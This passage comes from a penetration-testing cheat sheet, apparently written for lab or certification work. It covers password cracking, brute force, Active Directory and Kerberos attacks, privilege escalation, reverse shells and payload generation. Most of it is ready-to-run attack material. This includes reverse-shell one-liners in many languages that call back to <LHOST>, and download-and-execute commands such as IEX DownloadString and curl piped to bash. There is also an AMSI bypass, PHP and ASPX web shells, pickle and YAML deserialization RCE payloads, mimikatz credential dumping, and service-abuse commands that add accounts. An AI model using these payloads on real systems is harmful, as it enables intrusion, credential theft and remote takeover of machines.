zip2john archive.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Crack SSH key
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Crack KeePass
keepass2john Database.kdbx > keepass.hash
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

---

### Hydra — Online Brute Force

```bash
# SSH
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt ssh://<RHOST>
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<RHOST>

# HTTP Form POST
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt <RHOST> http-post-form \
    "/login:username=^USER^&password=^PASS^:Invalid"

# HTTP Basic Auth
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt http-get://<RHOST>

# SMB
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt smb://<RHOST>

# RDP
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt rdp://<RHOST>

# FTP
hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt ftp://<RHOST>

# MySQL
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<RHOST>
```

---

### CrackMapExec (netexec)

```bash
# SMB password spray
crackmapexec smb <RHOST> -u users.txt -p passwords.txt
crackmapexec smb <RHOST> -u <USERNAME> -p <PASSWORD>
crackmapexec smb <RHOST> -u <USERNAME> -H <HASH>           # PTH

# Execute commands
crackmapexec smb <RHOST> -u <USERNAME> -p <PASSWORD> -x "whoami"
crackmapexec smb <RHOST> -u <USERNAME> -p <PASSWORD> -X "powershell -c 'whoami'"

# Enumerate shares
crackmapexec smb <RHOST> -u <USERNAME> -p <PASSWORD> --shares

# Dump SAM / LSA
crackmapexec smb <RHOST> -u <USERNAME> -p <PASSWORD> --sam
crackmapexec smb <RHOST> -u <USERNAME> -p <PASSWORD> --lsa

# LDAP enumeration
crackmapexec ldap <RHOST> -u <USERNAME> -p <PASSWORD> --users
crackmapexec ldap <RHOST> -u <USERNAME> -p <PASSWORD> --groups
crackmapexec ldap <RHOST> -u <USERNAME> -p <PASSWORD> --bloodhound -ns <RHOST> -c All
```

---

### Kerbrute — Kerberos User Enumeration / Password Spray

```bash
# User enumeration (no credentials required)
kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt

# Password spray
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt '<PASSWORD>'

# Brute force single user
kerbrute bruteuser -d <DOMAIN> --dc <DC_IP> /usr/share/wordlists/rockyou.txt <USERNAME>
```

---

### mimikatz

```bash
# Privilege escalation within mimikatz
privilege::debug
token::elevate

# Dump logon passwords
sekurlsa::logonpasswords

# Dump NTLM hashes from SAM
lsadump::sam

# DCSync attack (pull hashes from DC)
lsadump::dcsync /domain:<DOMAIN> /user:krbtgt
lsadump::dcsync /domain:<DOMAIN> /all /csv

# Export Kerberos tickets
sekurlsa::tickets /export

# Pass-the-Hash
sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<HASH> /run:cmd.exe

# Overpass-the-Hash with AES256
sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /aes256:<KEY> /run:powershell.exe

# Dump AES keys
sekurlsa::ekeys

# Golden Ticket
kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /ptt

# Silver Ticket
kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<SID> /target:<TARGET> /service:cifs /rc4:<HASH> /ptt

# Inject ticket
kerberos::ptt <FILE>.kirbi

# Skeleton Key
misc::skeleton

# DPAPI
dpapi::cache
```

---

### pypykatz (Linux-based Mimikatz)

```bash
# Parse LSASS dump
pypykatz lsa minidump lsass.dmp

# Parse SAM and SYSTEM registry hives
pypykatz registry --sam SAM SYSTEM
```

---

### LaZagne — Credential Recovery

```bash
# Run all modules (Windows)
lazagne.exe all

# Specific categories
lazagne.exe browsers
lazagne.exe windows
lazagne.exe databases
```

---

### fcrackzip — ZIP Password Cracking

```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip
```

---

## 06 · Exploitation Tools

### Metasploit

```bash
# Start
msfconsole
msfconsole -q      # quiet mode

# Search and use
search <MODULE>
use <MODULE>
info
show options
set RHOSTS <RHOST>
set LHOST <LHOST>
set LPORT <LPORT>
run / exploit

# Common modules
use exploit/multi/handler              # catch reverse shells
use auxiliary/scanner/portscan/tcp     # TCP port scan
use auxiliary/scanner/smb/smb_ms17_010 # EternalBlue check
use exploit/windows/smb/ms17_010_eternalblue

# MSFvenom payload generation
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf
msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> \
    EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"

# List payloads
msfvenom -l payloads | grep windows
msfvenom -l payloads | grep linux
```

---

### ImageTragick (CVE-2016-3714)

```bash
# Exploit ImageMagick RCE
# Create malicious MVG file
cat > exploit.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://|id; curl <LHOST>/shell.sh | bash)'
pop graphic-context
EOF

convert exploit.mvg output.png
```

---

## 07 · Post Exploitation

### Enumeration — Linux

```bash
# Basic info
whoami; id; hostname; uname -a; cat /etc/os-release
ip a; ip r; cat /etc/hosts; netstat -antlp

# SUID / SGID binaries
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# World-writable directories
find / -writable -type d 2>/dev/null

# Sudo rights
sudo -l

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*
cat /var/spool/cron/crontabs/*

# Running processes
ps aux
ps -ef

# Network
netstat -antlp
ss -antlp

# Interesting files
find / -name "*.txt" -readable 2>/dev/null | head -20
find / -name "id_rsa" 2>/dev/null
find / -name ".bash_history" 2>/dev/null
find / -name "wp-config.php" 2>/dev/null
find / -name "config.php" 2>/dev/null
find /var /etc /home -name "*.bak" -o -name "*.old" 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# NFS shares
cat /etc/exports

# Installed packages
dpkg -l 2>/dev/null
rpm -qa 2>/dev/null
```

---

### Enumeration — Windows

```powershell
# Basic info
whoami /all
systeminfo
net user
net localgroup administrators
net group "Domain Admins" /domain

# Running processes
tasklist /svc
Get-Process

# Services
sc query
Get-Service

# Scheduled tasks
schtasks /query /fo LIST /v
Get-ScheduledTask

# Find files
dir /s /b *.log
dir flag* /s /p
findstr /SI /M "password" *.xml *.ini *.txt *.config

# Registry auto-run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Unquoted service paths
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Check patch level
wmic qfe get Caption,Description,HotFixID,InstalledOn

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Stored credentials
cmdkey /list

# DPAPI blobs
dir /a %APPDATA%\Microsoft\Credentials\
dir /a %LOCALAPPDATA%\Microsoft\Credentials\
```

---

### PowerShell — Useful Commands

```powershell
# Bypass execution policy
powershell -ep bypass
powershell -ExecutionPolicy Bypass -File script.ps1
Set-ExecutionPolicy Bypass -Scope Process -Force

# Download and execute in memory
IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1')
IEX(IWR http://<LHOST>/script.ps1 -UseBasicParsing)

# Download file
(New-Object Net.WebClient).DownloadFile('http://<LHOST>/<FILE>', 'C:\temp\<FILE>')
Invoke-WebRequest -Uri http://<LHOST>/<FILE> -OutFile C:\temp\<FILE>

# Encode command for execution
$cmd = 'IEX(New-Object Net.WebClient).DownloadString("http://<LHOST>/shell.ps1")'
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -enc $encoded

# Bypass AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

### Evil-WinRM

```bash
evil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD>
evil-winrm -i <RHOST> -u <USERNAME> -H <HASH>           # PTH
evil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD> -S   # SSL

# Inside session:
upload <LOCAL_FILE> <REMOTE_PATH>
download <REMOTE_FILE>
menu                           # list loaded modules
Invoke-Binary <FILE>.exe
```

---

### Impacket Suite

```bash
# PSExec — remote command execution
impacket-psexec <USERNAME>:<PASSWORD>@<RHOST>
impacket-psexec <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
impacket-psexec -hashes <LM>:<NTLM> <USERNAME>@<RHOST>

# WMI execution
impacket-wmiexec <USERNAME>:<PASSWORD>@<RHOST>

# SMBExec
impacket-smbexec <USERNAME>:<PASSWORD>@<RHOST>

# SecretsDump — credential extraction
impacket-secretsdump <USERNAME>:<PASSWORD>@<RHOST>
impacket-secretsdump -hashes <LM>:<NTLM> <USERNAME>@<RHOST>
impacket-secretsdump <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST> -just-dc   # DCSync

# GetUserSPNs — Kerberoasting
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -outputfile tgs.txt
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -request

# GetNPUsers — AS-REP Roasting
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -format hashcat -outputfile asrep.txt
impacket-GetNPUsers <DOMAIN>/<USERNAME>:<PASSWORD> -request -format hashcat

# NTLM relay
impacket-ntlmrelayx -tf targets.txt -smb2support

# Ticket requests
impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>
impacket-getST -spn cifs/<TARGET> <DOMAIN>/<USERNAME>:<PASSWORD>       # S4U
```

---

### BloodHound

```bash
# Collect data (from Windows)
SharpHound.exe -c All
SharpHound.exe -c All --zipfilename loot.zip

# Collect from Linux (BloodHound.py)
bloodhound-python -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -ns <DC_IP> -c All
bloodhound-python -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -ns <DC_IP> -c All --zip

# Start BloodHound
sudo neo4j start
bloodhound &
# Navigate to http://localhost:7474 for Neo4j

# Key Cypher queries
MATCH (m:User {owned:true}) RETURN m
MATCH p=shortestPath((m:User {owned:true})-[*1..]->(n:Domain)) RETURN p
MATCH (n:User {admincount:true}) RETURN n
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
```

---

### enum4linux-ng

```bash
enum4linux-ng -A <RHOST>
enum4linux-ng -A <RHOST> -u <USERNAME> -p <PASSWORD>
```

---

### ldapsearch

```bash
# Anonymous LDAP enumeration
ldapsearch -H ldap://<RHOST> -x -b "DC=<DOMAIN>,DC=<TLD>"
ldapsearch -H ldap://<RHOST> -x -b "DC=<DOMAIN>,DC=<TLD>" -s sub "(objectclass=user)"

# Authenticated
ldapsearch -H ldap://<RHOST> -x -D "<USERNAME>@<DOMAIN>" -w <PASSWORD> -b "DC=<DOMAIN>,DC=<TLD>"

# Enumerate users
ldapsearch -H ldap://<RHOST> -x -b "DC=<DOMAIN>,DC=<TLD>" "(samAccountType=805306368)" samaccountname

# Find admin users
ldapsearch -H ldap://<RHOST> -x -b "DC=<DOMAIN>,DC=<TLD>" "(adminCount=1)" dn
```

---

### rpcclient

```bash
rpcclient -U "" <RHOST>          # null session
rpcclient -U <USERNAME> <RHOST>

# Inside rpcclient:
srvinfo
enumdomusers
enumdomgroups
querydispinfo
queryuser <RID>
querygroup <RID>
getdompwinfo
lookupnames <USERNAME>
lsaenumsid
```

---

### Rubeus — Kerberos Attacks

```bash
# Kerberoasting
Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
Rubeus.exe kerberoast /user:<USERNAME> /outfile:hash.txt
Rubeus.exe kerberoast /rc4opsec                               # OPSEC-safe

# AS-REP Roasting
Rubeus.exe asreproast /nowrap
Rubeus.exe asreproast /user:<USERNAME> /format:hashcat

# Request TGT
Rubeus.exe asktgt /user:<USERNAME> /rc4:<HASH> /ptt
Rubeus.exe asktgt /user:<USERNAME> /aes256:<KEY> /ptt        # more stealthy

# Pass-the-Ticket
Rubeus.exe ptt /ticket:<BASE64_TICKET>
Rubeus.exe ptt /ticket:C:\ticket.kirbi

# Dump tickets
Rubeus.exe dump
Rubeus.exe dump /service:krbtgt /nowrap

# Monitor for new tickets (unconstrained delegation)
Rubeus.exe monitor /interval:5 /filteruser:DC01$

# S4U — constrained/resource-based delegation
Rubeus.exe s4u /user:<USERNAME> /rc4:<HASH> /impersonateuser:Administrator /msdsspn:"cifs/<TARGET>" /ptt

# Golden Ticket (AES256)
Rubeus.exe golden /aes256:<KRBTGT_AES> /user:Administrator /domain:<DOMAIN> /sid:<SID> /ptt
```

---

### Active Directory Certificate Services (AD CS)

```bash
# Enumerate vulnerable templates (Linux — Certipy)
certipy find -u <USERNAME>@<DOMAIN> -p <PASSWORD> -dc-ip <DC_IP>
certipy find -u <USERNAME>@<DOMAIN> -p <PASSWORD> -dc-ip <DC_IP> -vulnerable -stdout

# ESC1 — misconfigured template (request cert as DA)
certipy req -u <USERNAME>@<DOMAIN> -p <PASSWORD> -dc-ip <DC_IP> -target <CA_HOST> \
    -ca '<CA_NAME>' -template '<TEMPLATE>' -upn administrator@<DOMAIN>

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>

# Shadow Credentials attack
certipy shadow auto -u <USERNAME>@<DOMAIN> -p <PASSWORD> -dc-ip <DC_IP> -account <TARGET_USER>

# Windows — Certify
Certify.exe find /vulnerable
Certify.exe request /ca:<CA_HOST>\<CA_NAME> /template:<TEMPLATE> /altname:administrator

# PassTheCert — authenticate with cert
PassTheCert.exe --server <DC_IP> --cert-path admin.pfx --add-machine-account

# PKINITtools
python3 gettgtpkinit.py -cert-pfx admin.pfx -dc-ip <DC_IP> <DOMAIN>/administrator admin.ccache
export KRB5CCNAME=admin.ccache
python3 getnthash.py -key <AS_REP_KEY> <DOMAIN>/administrator
```

---

### bloodyAD — AD Object Manipulation

```bash
# Add user to group
bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <DC_IP> add groupMember "<GROUP>" "<USER>"

# Reset password
bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <DC_IP> set password <TARGET_USER> 'NewPass123!'

# Set RBCD
bloodyAD -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --host <DC_IP> set object <TARGET_COMPUTER> msDS-AllowedToActOnBehalfOfOtherIdentity
```

---

### powercat — PowerShell Netcat

```powershell
# Load
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')

# Reverse shell
powercat -c <LHOST> -p <LPORT> -e cmd

# Listener
powercat -l -p <LPORT> -e cmd

# File transfer
powercat -c <LHOST> -p <LPORT> -i <FILE>
```

---

### pwncat — Enhanced Reverse Shell Handler

```bash
pwncat-cs -lp <LPORT>

# Inside pwncat:
upload <FILE> <REMOTE_PATH>
download <REMOTE_FILE> <LOCAL_PATH>
run enumerate.system
run privesc.sudo
```

---

### RunasCs — Run as Another User (Windows)

```powershell
RunasCs.exe <USERNAME> <PASSWORD> cmd.exe -r <LHOST>:<LPORT>
RunasCs.exe <USERNAME> <PASSWORD> "powershell -c whoami" --bypass-uac
```

---

### smbpasswd / winexe

```bash
# Change SMB password
smbpasswd -r <RHOST> -U <USERNAME>

# winexe — remote Windows shell
winexe -U '<DOMAIN>/<USERNAME>%<PASSWORD>' //<RHOST>/ cmd.exe
```

---

### Powermad — Create Machine Accounts (RBCD)

```powershell
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount FakePC -Password (ConvertTo-SecureString 'FakeP@ss!' -AsPlainText -Force)
```

---

### JAWS — Windows Privilege Escalation Recon

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/jaws-enum.ps1')
```

---

## 08 · CVEs & Local Privilege Escalation

### Linux LPE — Quick Reference

|CVE|Description|Tool|
|---|---|---|
|CVE-2016-5195|Dirty COW — kernel race condition|[dirtycow](https://github.com/firefart/dirtycow)|
|CVE-2021-3156|Sudo / sudoedit heap overflow|[CVE-2021-3156](https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit)|
|CVE-2021-4034|PwnKit — pkexec LPE|[PwnKit](https://github.com/ly4k/PwnKit)|
|CVE-2022-0847|Dirty Pipe — pipe write LPE|[DirtyPipe](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)|
|CVE-2023-4911|Looney Tunables — glibc buffer overflow|[PoC](https://github.com/leesh3288/CVE-2023-4911)|
|CVE-2023-32629, 2023-2640|GameOverlay Ubuntu kernel LPE|`unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'`|

### Linux LPE — Key Commands

```bash
# CVE-2019-14287: Sudo bypass (sudo < 1.8.28)
sudo -u#-1 /bin/bash

# CVE-2021-3156: sudoedit -s bypass
sudoedit -s '\' $(python3 -c 'print("A"*1000)')

# CVE-2022-31214: Firejail privilege escalation
# (run as normal user, firejail must be SUID)
firejail --join=<PID_OF_ROOT_FIREJAIL>
su -

# CVE-2016-1531: exim <= 4.84 LPE
exim -bV    # confirm version
# Download and run exploit

# Check for vulnerable sudo version
sudo --version
```

---

### Windows LPE — Token Impersonation (Potato Family)

|Tool|Requirement|Notes|
|---|---|---|
|**PrintSpoofer**|`SeImpersonatePrivilege`|Windows 10 / Server 2019|
|**GodPotato**|`SeImpersonatePrivilege`|Windows Server 2012–2022|
|**JuicyPotato**|`SeImpersonatePrivilege`|Older Windows (not 2019+)|
|**JuicyPotatoNG**|`SeImpersonatePrivilege`|Newer Windows variant|
|**SweetPotato**|`SeImpersonatePrivilege`|Combines multiple techniques|
|**RoguePotato**|`SeImpersonatePrivilege`|Newer potato|
|**SharpEfsPotato**|`SeImpersonatePrivilege`|EFS-based coerce|
|**GhostPotato**|`SeImpersonatePrivilege`|Ghost method|

```cmd
PrintSpoofer.exe -i -c cmd
GodPotato -cmd "cmd /c whoami"
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}
JuicyPotatoNG.exe -t * -p "cmd.exe" -a "/c whoami > C:\output.txt"
```

---

### Windows LPE — Key CVEs

```bash
# CVE-2020-1472: ZeroLogon — Domain Controller privilege escalation
python3 cve-2020-1472-exploit.py <NETBIOS_DC_NAME> <DC_IP>
# Then restore password with secretsdump

# CVE-2021-1675 / CVE-2021-34527: PrintNightmare (LPE + RCE)
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pass123!" -DriverName "PrintMe"

# CVE-2023-21746: LocalPotato
LocalPotato.exe -i <INFILE> -o <OUTFILE>

# CVE-2023-22809: sudoedit LPE
# When sudoedit runs with wildcard in allowed command path:
EDITOR="vim -- /etc/sudoers" sudoedit <ALLOWED_FILE>

# CVE-2022-30190: Follina MS-MSDT
python3 follina.py -p 80 -c "powershell -c 'IEX(IWR http://<LHOST>/shell.ps1)'"

# CVE-2014-6271: Shellshock
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1" http://<RHOST>/cgi-bin/test.sh
```

---

### Windows LPE — Miscellaneous

```cmd
# AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi

# Unquoted service path
sc qc <SERVICE_NAME>
# If path has spaces without quotes: C:\Program Files\Service\service.exe
# Place exploit at: C:\Program.exe or C:\Program Files\Service.exe

# DLL Hijacking
# Identify writable DLL path, drop malicious DLL

# Stored credentials via cmdkey
cmdkey /list
runas /savecred /user:<USERNAME> cmd.exe

# Weak service permissions
sc sdshow <SERVICE_NAME>
# If you have write permissions:
sc config <SERVICE_NAME> binpath= "cmd /c net user hacker Pass123! /add"
sc start <SERVICE_NAME>
```

---

## 09 · Payloads & Reverse Shells

### Reverse Shells — Linux

```bash
# Bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
0<&196;exec 196<>/dev/tcp/<LHOST>/<LPORT>; sh <&196 >&196 2>&196

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat
nc -e /bin/bash <LHOST> <LPORT>
nc -e /bin/sh <LHOST> <LPORT>
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <LHOST> <LPORT> > /tmp/f

# PHP
php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
<?php system($_GET['cmd']); ?>                                    # webshell
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"); ?>

# Perl
perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));STDIN->fdopen(S,r);$~->fdopen(S,w);system$_ while<>;'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Socat (full TTY)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>
```

### Reverse Shells — Windows

```powershell
# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Nishang — Invoke-PowerShellTcp
IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>

# powercat
powercat -c <LHOST> -p <LPORT> -e cmd
```

---

### Web Shells

```php
# PHP minimal
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>

# PHP with file upload
<?php
if(isset($_FILES['file'])){
    $path = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['file']['name'];
    move_uploaded_file($_FILES['file']['tmp_name'], $path);
}
system($_GET['cmd']);
?>
```

```aspx
<!-- ASPX web shell -->
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e) {
    string cmd = Request.QueryString["cmd"];
    if (cmd != null) {
        Process proc = new Process();
        proc.StartInfo.FileName = "cmd.exe";
        proc.StartInfo.Arguments = "/c " + cmd;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.StartInfo.UseShellExecute = false;
        proc.Start();
        Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
```

---

### Payload Generation with msfvenom

```bash
# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe

# Windows DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o shell.dll

# Windows MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o shell.msi

# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf
chmod +x shell.elf

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war

# PHP
msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php

# Staged PowerShell encoder
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> \
    EXITFUNC=thread -f ps1 | base64 | tr -d '\n'
```

---

### Shikata Ga Nai Encoding (AV Evasion)

```bash
# Encode existing payload
./sgn -p <PAYLOAD.BIN> -a 64 -c 1 -o encoded.bin

# Verify with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> \
    -e x86/shikata_ga_nai -i 3 -f exe -o encoded.exe
```

---

### Python Pickle RCE

```python
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"',))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())
```

---

### Python Redirect for SSRF

```python
#!/usr/bin/env python3
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header("Location", sys.argv[1])
        self.end_headers()

HTTPServer(("", 80), Redirect).serve_forever()
```

---

## 10 · Templates

### Exploit Skeleton Python Script

```python
#!/usr/bin/env python3
import requests

target = "http://<RHOST>"

def exploit():
    # Your exploit logic here
    r = requests.get(target)
    print(r.status_code)
    print(r.text)

if __name__ == "__main__":
    exploit()
```

---

### JSON POST Request Template

```python
import requests
import json

url = "http://<RHOST>/api/endpoint"
headers = {"Content-Type": "application/json"}
data = {"key": "value", "cmd": "whoami"}

r = requests.post(url, headers=headers, data=json.dumps(data))
print(r.text)
```

---

### Bad YAML (Deserialization RCE)

```yaml
# PyYAML < 5.1 unsafe load
!!python/object/apply:os.system ["bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"]

# Ruby YAML
--- !ruby/object:Gem::Installer
    i: x
--- !ruby/object:Gem::SpecFetcher
    i: y
--- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"
         method_id: :resolve
```

---

### ASPX Web Shell Template

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
    string cmd = Request.QueryString["cmd"];
    if(cmd != null){
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.UseShellExecute = false;
        p.Start();
        Response.Write("<pre>" + Server.HtmlEncode(p.StandardOutput.ReadToEnd()) + "</pre>");
    }
%>
```

---

## Tool Reference Index

### Basics & Infrastructure

|Tool|URL|Purpose|
|---|---|---|
|Chisel|https://github.com/jpillora/chisel|TCP tunneling / SOCKS proxy|
|Ligolo-ng|https://github.com/nicocha30/ligolo-ng|Layer 3 tunneling|
|CyberChef|https://gchq.github.io/CyberChef|Encode/decode/transform|
|Swaks|https://github.com/jetmore/swaks|SMTP testing|

### Information Gathering

|Tool|URL|Purpose|
|---|---|---|
|Nmap|https://github.com/nmap/nmap|Port scanning / service detection|
|nikto|https://github.com/sullo/nikto|Web server vulnerability scan|

### Web Application Analysis

|Tool|URL|Purpose|
|---|---|---|
|ffuf|https://github.com/ffuf/ffuf|Web fuzzing|
|Gobuster|https://github.com/OJ/gobuster|Directory / DNS brute force|
|WPScan|https://github.com/wpscanteam/wpscan|WordPress enumeration|
|JWT_Tool|https://github.com/ticarpi/jwt_tool|JWT testing|
|PayloadsAllTheThings|https://github.com/swisskyrepo/PayloadsAllTheThings|Payload reference|
|PHPGGC|https://github.com/ambionics/phpggc|PHP gadget chains|

### Password Attacks

|Tool|URL|Purpose|
|---|---|---|
|hashcat|https://hashcat.net/hashcat|GPU hash cracking|
|John|https://github.com/openwall/john|CPU hash cracking|
|Hydra|https://github.com/vanhauser-thc/thc-hydra|Online brute force|
|Kerbrute|https://github.com/ropnop/kerbrute|Kerberos enum/spray|
|mimikatz|https://github.com/gentilkiwi/mimikatz|Windows credential extraction|
|CrackMapExec|https://github.com/byt3bl33d3r/CrackMapExec|AD/SMB enumeration + spray|
|LaZagne|https://github.com/AlessandroZ/LaZagne|Credential recovery|
|keepass-dump-masterkey|https://github.com/CMEPW/keepass-dump-masterkey|KeePass master key dump|
|Default Credentials|https://github.com/ihebski/DefaultCreds-cheat-sheet|Default cred lookup|

